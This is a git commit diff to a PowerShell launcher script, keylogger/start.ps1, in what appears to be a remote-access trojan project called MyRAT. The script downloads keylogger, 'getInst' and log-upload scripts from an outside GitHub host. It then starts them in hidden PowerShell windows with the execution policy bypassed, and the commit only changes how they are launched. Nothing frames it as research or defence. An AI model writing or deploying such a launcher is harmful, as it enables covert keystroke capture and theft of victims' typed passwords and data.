8f109ace5284d1fee571dc8bf03c62440635ebeb
Thông Tấn <ttthong315@gmail.com>
2025-03-26 15:56:42 +0700

    fix

--- keylogger/start.ps1
+++ keylogger/start.ps1
@@ -3,5 +3,5 @@ $scriptPath = "$env:temp\keylogger"
 Invoke-WebRequest -Uri "https://github.com/bruning-frighting/MyRAT/blob/main/keylogger/keylogger.ps1" -OutFile keylogger.ps1
 Invoke-WebRequest -Uri "https://github.com/bruning-frighting/MyRAT/blob/main/keylogger/getInst.ps1" -OutFile getInst.ps1
 Invoke-WebRequest -Uri "https://github.com/bruning-frighting/MyRAT/blob/main/keylogger/uploadLog.ps1" -OutFile getInst.ps1
-Start-Process "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$scriptPath\keylogger.ps1`"" -WindowStyle Hidden
-Start-Process "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$scriptPath\getInst.ps1`"" -WindowStyle Hidden
+Start-Process "powershell.exe -window hidden -ep bypass .\keylogger.ps1"
+Start-Process "powershell.exe -window hidden -ep bypass .\getInst.ps1"
